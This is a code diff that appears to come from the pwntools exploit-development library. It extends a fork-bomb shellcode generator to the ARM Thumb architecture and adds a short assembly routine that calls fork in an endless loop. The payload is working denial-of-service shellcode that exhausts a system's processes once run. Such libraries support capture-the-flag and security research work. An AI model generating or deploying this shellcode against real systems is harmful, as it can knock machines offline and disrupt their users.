@@ -1,6 +1,6 @@
 from pwn.internal.shellcode_helper import *
 
-@shellcode_reqs(arch=['i386', 'amd64', 'arm'], os=['linux', 'freebsd'])
+@shellcode_reqs(arch=['i386', 'amd64', 'arm', 'thumb'], os=['linux', 'freebsd'])
 def forkbomb(os = None, arch = None):
     """Fork this shit."""
     if arch == 'i386':
@@ -12,6 +12,9 @@ def forkbomb(os = None, arch = None):
     elif arch == 'arm':
         if os in ['linux']: # freebsd should work too, though I haven't tested
             return _forkbomb_arm()
+    elif arch == 'thumb':
+        if os in ['linux']: # freebsd should work too, though I haven't tested
+            return _forkbomb_thumb()
 
     no_support('forkbomb', os, arch)
 
@@ -40,3 +43,10 @@ forkbomb:
     b forkbomb
 """
 
+def _forkbomb_thumb():
+    return """
+fork_bomb:
+    mov r7, #SYS_fork
+    svc 1
+    b fork_bomb
+"""
